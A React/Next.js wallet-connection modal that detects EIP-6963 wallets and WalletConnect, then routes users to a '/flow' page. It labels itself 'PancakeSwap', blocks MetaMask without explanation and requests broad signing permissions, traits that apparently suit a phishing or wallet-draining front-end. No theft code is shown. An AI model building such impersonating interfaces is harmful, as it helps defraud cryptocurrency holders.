'use client';

import { useEffect, useMemo, useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import {
  discoverEIP6963Providers,
  isMetaMaskInstalled,
  isMetaMaskProvider,
  type EIP6963ProviderDetail,
} from '@/lib/eip6963';
import { setSelectedProvider } from '@/lib/providerStore';

export function WalletPickerModal({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (next: boolean) => void;
}) {
  const router = useRouter();
  const [providers, setProviders] = useState<EIP6963ProviderDetail[]>([]);
  const [loading, setLoading] = useState(true);
  const [mmDetected, setMmDetected] = useState(false);

  useEffect(() => {
    if (!open) return;
    let cancelled = false;
    setLoading(true);

    void discoverEIP6963Providers(800).then((next) => {
      if (cancelled) return;
      setProviders(next);
      setMmDetected(isMetaMaskInstalled());
      setLoading(false);
    });

    return () => {
      cancelled = true;
    };
  }, [open]);

  const wallets = useMemo(
    () =>
      providers.map((d) => ({
        name: d.info?.name ?? 'Wallet',
        rdns: d.info?.rdns ?? '',
        icon: d.info?.icon || '',
        detail: d,
      })),
    [providers]
  );

  async function connect(detail: EIP6963ProviderDetail) {
    try {
      if (isMetaMaskProvider(detail.provider)) {
        throw new Error('MetaMask is not supported');
      }

      try {
        await detail.provider.request({
          method: 'wallet_requestPermissions',
          params: [{ eth_accounts: {} }],
        });
      } catch {}

      const accounts = await detail.provider.request({ method: 'eth_requestAccounts' });
      if (!accounts?.length) throw new Error('No accounts returned');

      setSelectedProvider(detail.provider, detail.info.rdns);
      onOpenChange(false);
      router.push('/flow');
    } catch (e) {
      console.error('connect failed', e);
    }
  }

  async function connectWalletConnect() {
    try {
      const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || '';
      if (!projectId) {
        throw new Error('WalletConnect project ID is missing');
      }

      const provider = await EthereumProvider.init({
        projectId,
        chains: [1],
        optionalChains: [1, 56, 137, 42161, 10, 8453, 43114],
        showQrModal: true,
        methods: [
          'eth_sendTransaction',
          'personal_sign',
          'eth_signTypedData_v4',
          'wallet_switchEthereumChain',
          'eth_requestAccounts',
        ],
        events: ['chainChanged', 'accountsChanged'],
        metadata: {
          name: 'PancakeSwap',
          description: 'Trade, earn, win crypto',
          url: typeof window !== 'undefined' ? window.location.origin : '',
          icons: [],
        },
      });

      await provider.connect();
      const accounts = provider.accounts ?? [];
      if (!accounts.length) throw new Error('No accounts returned');

      setSelectedProvider(provider, 'walletconnect');
      onOpenChange(false);
      router.push('/flow');
    } catch (e) {
      console.error('walletconnect failed', e);
    }
  }

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-end justify-center bg-black/50 backdrop-blur-sm md:items-center"
          onClick={() => onOpenChange(false)}
        >
          <motion.div
            initial={{ y: '100%', opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: '100%', opacity: 0 }}
            transition={{ type: 'spring', damping: 30, stiffness: 300 }}
            onClick={(e: React.MouseEvent<HTMLDivElement>) => e.stopPropagation()}
            className="w-full max-w-[440px] rounded-t-[24px] bg-white p-6 md:rounded-[24px]"
          >
            <div className="mb-5 flex items-center justify-between">
              <h2 className="text-[20px] font-[800] text-[#1A1A1A]">Connect Wallet</h2>
              <button
                onClick={() => onOpenChange(false)}
                className="flex h-8 w-8 items-center justify-center rounded-full text-[#666666] transition-colors hover:bg-[#F9F9F9]"
                aria-label="Close"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                  <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" />
                </svg>
              </button>
            </div>

            {mmDetected && (
              <div className="mb-4 rounded-[16px] border border-[#1FC7D4]/40 bg-[#E8FBFD] p-4">
                <div className="mb-1 text-[14px] font-[800] text-[#1FC7D4]">
                  MetaMask is not supported
                </div>
                <div className="text-[13px] leading-[1.5] text-[#666666]">
                  Please use one of the wallets below to continue.
                </div>
              </div>
            )}

            {loading && (
              <div className="space-y-2">
                {[0, 1, 2].map((i) => (
                  <div
                    key={i}
                    className="skeleton h-[68px] w-full rounded-[16px]"
                  />
                ))}
              </div>
            )}

            {!loading && wallets.length === 0 && (
              <div className="rounded-[16px] bg-[#F9F9F9] p-6 text-center text-[13px] leading-[1.5] text-[#666666]">
                No compatible wallets detected. Install Trust Wallet, Rabby,
                Wallet, or OKX Wallet to continue.
              </div>
            )}

            <div className="max-h-[60vh] space-y-2 overflow-y-auto">
              {wallets.map((w) => (
                <motion.button
                  key={w.rdns || w.name}
                  whileHover={{ scale: 1.01 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => void connect(w.detail)}
                  className="flex w-full items-center justify-between rounded-[16px] border border-[#E5E5E5] bg-white px-3 py-3 text-left transition-colors hover:border-[#1FC7D4] hover:bg-[#F9F9F9]"
                >
                  <span className="flex items-center gap-3">
                    <span className="flex h-10 w-10 items-center justify-center overflow-hidden rounded-full bg-[#F9F9F9]">
                      {w.icon ? (
                        <img src={w.icon} alt={w.name} width={28} height={28} />
                      ) : (
                        <span className="text-[14px] font-[800] text-[#1FC7D4]">
                          {w.name.slice(0, 1)}
                        </span>
                      )}
                    </span>
                    <span className="text-[14px] font-[600] text-[#1A1A1A]">
                      {w.name}
                    </span>
                  </span>
                  <span className="rounded-full bg-[#E8FBFD] px-2 py-1 text-[10px] font-[800] uppercase tracking-[0.14em] text-[#1FC7D4]">
                    Detected
                  </span>
                </motion.button>
              ))}

              <motion.button
                whileHover={{ scale: 1.01 }}
                whileTap={{ scale: 0.99 }}
                onClick={() => void connectWalletConnect()}
                className="flex w-full items-center justify-between rounded-[16px] border border-[#E5E5E5] bg-white px-3 py-3 text-left transition-colors hover:border-[#1FC7D4] hover:bg-[#F9F9F9]"
              >
                <span className="flex items-center gap-3">
                  <span className="flex h-10 w-10 items-center justify-center overflow-hidden rounded-full bg-[#F9F9F9]">
                    <span className="text-[14px] font-[800] text-[#1FC7D4]">W</span>
                  </span>
                  <span className="text-[14px] font-[600] text-[#1A1A1A]">WalletConnect</span>
                </span>
                <span className="rounded-full bg-[#E8FBFD] px-2 py-1 text-[10px] font-[800] uppercase tracking-[0.14em] text-[#1FC7D4]">
                  QR
                </span>
              </motion.button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
